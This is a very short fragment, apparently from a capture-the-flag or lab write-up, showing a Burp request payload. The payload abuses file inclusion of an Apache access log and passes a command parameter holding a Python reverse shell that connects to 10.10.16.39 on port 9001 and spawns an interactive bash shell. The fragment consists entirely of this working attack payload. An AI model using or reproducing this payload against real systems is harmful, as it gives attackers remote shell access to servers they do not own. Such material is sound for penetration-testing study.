...
Burp payload:
```
file=%2Fvar%2Flog%2Fapache2%2Faccess.log&cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("10.10.16.39",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```
